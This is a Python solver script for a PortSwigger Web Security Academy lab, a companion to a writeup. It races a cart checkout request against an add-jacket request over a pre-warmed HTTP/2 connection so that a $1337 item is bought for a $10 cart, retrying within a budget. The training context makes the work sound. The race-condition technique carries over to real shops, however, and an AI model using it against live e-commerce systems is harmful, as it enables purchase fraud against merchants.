#!/usr/bin/env python3
"""
Multi-endpoint race conditions
PortSwigger Web Security Academy -- Race Conditions

Companion script for the writeup: 03-multi-endpoint-race-conditions.md

What this does:
    Buys a $10 gift card to bring the cart's validated total under the $100
    credit limit, then races POST /cart/checkout against POST /cart (adding
    the $1337 leather jacket) as two concurrent coroutines under an
    httpx.AsyncClient(http2=True), launched together via asyncio.gather().
    Before the race, it sends a plain GET / first to pre-establish the HTTP/2
    connection -- a connection-warming step that matters because a fresh
    TLS/HTTP2 handshake on the first real request would introduce its own
    delay relative to the second request, undermining the timing alignment
    between the two racing endpoints. If checkout validates the $10 cart
    before the jacket-adding request commits, but confirms the order after
    it, the jacket rides along for free. The attack is probabilistic (about
    1 in 9 attempts) and each failure costs $10 for a fresh gift card, so
    this retries with a real budget ceiling matching the $100 starting
    credit.

Usage:
    python 03-multi-endpoint-race-conditions.py <lab-url>

Requirements:
    pip install httpx[http2]
"""

import asyncio
import re
import sys

import httpx

GIFT_CARD_PRODUCT_ID = "2"   # $10 gift card
JACKET_PRODUCT_ID = "1"      # $1337 leather jacket
MAX_ATTEMPTS = 10            # ~$100 credit / $10 per failed gift-card purchase


def _csrf(html: str) -> str:
    m = re.search(r'name="csrf"\s+value="([^"]+)"', html)
    return m.group(1) if m else ""


async def solve_async(lab_url: str) -> None:
    async with httpx.AsyncClient(http2=True, timeout=15, follow_redirects=True) as client:
        r = await client.get(f"{lab_url}/login")
        csrf = _csrf(r.text)
        await client.post(f"{lab_url}/login", data={"csrf": csrf, "username": "wiener", "password": "peter"})

        for attempt in range(1, MAX_ATTEMPTS + 1):
            print(f"[*] Attempt {attempt}/{MAX_ATTEMPTS}: buying a fresh $10 gift card")
            r = await client.get(f"{lab_url}/cart")
            csrf = _csrf(r.text)
            await client.post(f"{lab_url}/cart", data={
                "productId": GIFT_CARD_PRODUCT_ID, "redir": "PRODUCT", "quantity": "1",
            })

            r = await client.get(f"{lab_url}/cart")
            csrf = _csrf(r.text)

            # Connection warming -- align the timing of the two racing endpoints
            # by making sure the HTTP/2 connection is already up before the race.
            await client.get(lab_url)

            async def do_checkout():
                return await client.post(f"{lab_url}/cart/checkout", data={"csrf": csrf})

            async def do_add_jacket():
                return await client.post(f"{lab_url}/cart", data={
                    "productId": JACKET_PRODUCT_ID, "redir": "PRODUCT", "quantity": "1",
                })

            checkout_resp, add_resp = await asyncio.gather(do_checkout(), do_add_jacket())
            print(f"[*] checkout={checkout_resp.status_code} add-jacket={add_resp.status_code}")

            check = await client.get(lab_url)
            if "Congratulations" in check.text:
                print("[+] Lab solved -- jacket rode along inside the checkout validation window.")
                return

            r = await client.get(f"{lab_url}/cart")
            if "Lightweight" in r.text and "Leather Jacket" in r.text:
                print("[-] Jacket is in the cart but the order wasn't confirmed with it -- retrying")
            else:
                print("[-] Race missed the window this round -- retrying with a fresh gift card")

        print(f"[-] Not solved after {MAX_ATTEMPTS} attempts (budget exhausted). Re-run for a fresh $100 credit.")


def solve(lab_url: str) -> None:
    asyncio.run(solve_async(lab_url))


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
